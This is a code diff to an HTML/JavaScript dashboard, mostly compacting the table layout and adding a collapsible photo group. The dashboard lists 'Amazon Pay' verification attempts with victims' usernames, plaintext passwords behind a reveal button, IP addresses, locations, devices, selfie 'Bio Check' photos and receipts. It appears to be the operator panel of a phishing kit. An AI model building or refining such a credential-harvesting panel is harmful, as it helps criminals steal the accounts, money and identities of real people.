@@ -78,6 +78,75 @@
             cursor: pointer;
             accent-color: #2563eb;
         }
+
+        /* Compact Dashboard Fixes */
+        .table-wrap td,
+        .table-wrap th {
+            padding: 8px 12px !important;
+            vertical-align: top;
+        }
+
+        /* Photo Grid Compactness */
+        .photo-actions-row {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 4px;
+            max-width: 280px;
+        }
+
+        .photo-stack-btn {
+            padding: 2px 6px !important;
+            font-size: 10px !important;
+            height: auto !important;
+            border-radius: 4px !important;
+        }
+
+        .photo-group {
+            margin-top: 4px !important;
+            padding-top: 4px !important;
+            border-top: 1px dashed #eee !important;
+        }
+
+        /* Location Compactness */
+        .cell-meta {
+            font-size: 11px !important;
+            line-height: 1.3 !important;
+            color: #64748b;
+        }
+
+        .cell-strong {
+            font-weight: 600;
+            font-size: 13px;
+            margin-bottom: 2px;
+        }
+
+        /* Limit row height */
+        tr {
+            height: auto !important;
+        }
+
+        /* Expand/Collapse Photos */
+        .photo-expand-btn {
+            background: #f1f5f9;
+            border: 1px solid #cbd5e1;
+            color: #475569;
+            font-size: 10px;
+            padding: 2px 8px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        .photo-expand-btn:hover {
+            background: #e2e8f0;
+        }
+
+        .hidden-photos {
+            display: none;
+        }
+
+        .visible-photos {
+            display: contents;
+        }
     </style>
 </head>
 
@@ -543,61 +612,74 @@
                      </button>`;
                 };
 
+                const renderPhotoGroup = (photos, label, type, baseIndex = 0) => {
+                    if (photos.length === 0) return '';
+                    const limit = 4; // Show 4 max initiallly
+                    const visible = photos.slice(0, limit);
+                    const hidden = photos.slice(limit);
+                    const groupId = `photos-${attempt.verificationId}-${type}`;
+                    const color = type === 'bio' ? 'success' : 'primary';
+                    const icon = type === 'bio' ? '👤' : '🧾';
+
+                    let html = `<div class="photo-group">
+                        <div class="photo-label" style="font-size:10px; margin-bottom:2px; font-weight:700; color:#475569; text-transform:uppercase; letter-spacing:0.5px;">${icon} ${label} <span style="font-weight:400; color:#94a3b8">(${photos.length})</span></div>
+                        <div class="photo-actions-row">
+                            ${visible.map((p, i) => renderPhotoBtn(p, `#${baseIndex + i + 1}`, color)).join('')}`;
+
+                    if (hidden.length > 0) {
+                        html += `<span id="${groupId}" style="display:none;">
+                                    ${hidden.map((p, i) => renderPhotoBtn(p, `#${baseIndex + limit + i + 1}`, color)).join('')}
+                                 </span>
+                                 <button class="photo-expand-btn" onclick="togglePhotos('${groupId}', this)">+${hidden.length}</button>`;
+                    }
+                    html += `</div></div>`;
+                    return html;
+                };
+
                 return `
                     <tr>
-                        <td>
-                            <div class="cell-id">${attempt.verificationId || '—'}</div>
+                        <td style="width:120px;">
+                            <div class="cell-id" style="font-size:12px;">${attempt.verificationId || '—'}</div>
                             <div class="cell-meta">Amazon Pay</div>
                         </td>
-                        <td>
-                            <span class="badge ${statusClass}">
+                        <td style="width:100px;">
+                            <span class="badge ${statusClass}" style="padding:2px 6px; font-size:10px;">
                                 <span class="badge-dot"></span>
                                 ${status}
                             </span>
-                            <div class="cell-meta" style="margin-top:4px">${attempt.amount || '₹0.00'}</div>
+                            <div class="cell-meta" style="margin-top:2px; font-weight:700;">${attempt.amount || '₹0.00'}</div>
                         </td>
-                        <td>
+                        <td style="width:90px;">
                             <div class="cell-strong">${time}</div>
                             <div class="cell-meta">${date}</div>
                         </td>
-                        <td>
+                        <td style="max-width:140px; overflow:hidden; text-overflow:ellipsis;">
                             <div class="cell-strong">${escapeHtml(attempt.username || 'Unknown')}</div>
-                            <div class="cell-meta">${attempt.ip || '—'}</div>
+                            <div class="cell-meta" style="font-family:monospace;">${attempt.ip || '—'}</div>
                         </td>
-                        <td style="min-width: 220px;">${location}</td>
-                        <td>${device}</td>
-                        <td>
-                            <div class="cred-wrap">
+                        <td style="min-width: 180px; font-size:11px;">${location}</td>
+                        <td style="max-width: 120px; font-size:11px;">
+                            <div style="white-space:nowrap; overflow:hidden; text-overflow:ellipsis;" title="${device}">${device}</div>
+                        </td>
+                        <td style="width:140px;">
+                            <div class="cred-wrap" style="gap:2px;">
                                 <div class="cred-row">
-                                    <span class="cred-label">U</span>
-                                    <span class="cred-value masked" id="user-${index}" data-value="${escapeHtml(attempt.username || '')}">${maskString(attempt.username || '')}</span>
+                                    <span class="cred-label" style="font-size:9px;">U</span>
+                                    <span class="cred-value masked" id="user-${index}" data-value="${escapeHtml(attempt.username || '')}" style="font-size:11px;">${maskString(attempt.username || '')}</span>
                                 </div>
                                 <div class="cred-row">
-                                    <span class="cred-label">P</span>
-                                    <span class="cred-value masked" id="pass-${index}" data-value="${escapeHtml(attempt.password || '')}">${maskString(attempt.password || '')}</span>
+                                    <span class="cred-label" style="font-size:9px;">P</span>
+                                    <span class="cred-value masked" id="pass-${index}" data-value="${escapeHtml(attempt.password || '')}" style="font-size:11px;">${maskString(attempt.password || '')}</span>
                                 </div>
-                                <button class="reveal-btn" id="btn-${index}" onclick="toggleCredentials(${index})">👁️ Show</button>
+                                <button class="reveal-btn" id="btn-${index}" onclick="toggleCredentials(${index})" style="font-size:9px; padding:1px 4px; margin-top:2px;">Show</button>
                             </div>
                         </td>
-                        <td>
+                        <td style="min-width:160px;">
                             <div class="photo-cell-content">
-                                ${bioPhotos.length > 0 ?
-                        `<div class="photo-group">
-                                        <div class="photo-label">Bio Check (${bioPhotos.length})</div>
-                                        <div class="photo-actions-row">
-                                           ${bioPhotos.map((p, i) => renderPhotoBtn(p, `#${i + 1}`, 'success')).join('')}
-                                        </div>
-                                    </div>` : ''}
-                                
-                                ${receiptPhotos.length > 0 ?
-                        `<div class="photo-group" style="margin-top: 8px; padding-top: 8px; border-top: 1px dashed #eee;">
-                                        <div class="photo-label">Receipt (${receiptPhotos.length})</div>
-                                         <div class="photo-actions-row">
-                                           ${receiptPhotos.map((p, i) => renderPhotoBtn(p, `#${i + 1}`, 'primary')).join('')}
-                                        </div>
-                                    </div>` : ''}
+                                ${renderPhotoGroup(bioPhotos, 'Bio Check', 'bio', 0)}
+                                ${renderPhotoGroup(receiptPhotos, 'Receipt', 'receipt', 5)}
+                                ${allPhotos.length === 0 ? '<span class="text-muted" style="font-size:11px;">—</span>' : ''}
 
-                                ${allPhotos.length === 0 ? '<span class="text-muted">—</span>' : ''}
                             </div>
                         </td>
                     </tr>
@@ -1388,6 +1470,22 @@
             } catch (err) {
                 console.error(err);
                 resultContainer.innerHTML = `<div style="padding:20px; text-align:center; color:#ef4444;">Offline: Could not connect to intelligence grid.</div>`;
+            }
+        }
+        function togglePhotos(groupId, btn) {
+            const container = document.getElementById(groupId);
+            if (container.style.display === 'none') {
+                // Determine layout based on number of items
+                const count = container.children.length;
+                if (count > 10) {
+                    container.style.display = 'grid';
+                    container.style.gridTemplateColumns = 'repeat(auto-fill, minmax(60px, 1fr))';
+                    container.style.width = '100%';
+                    container.parentElement.style.maxWidth = '100%'; // Allow expansion
+                } else {
+                    container.style.display = 'contents';
+                }
+                btn.style.display = 'none';
             }
         }
     </script>
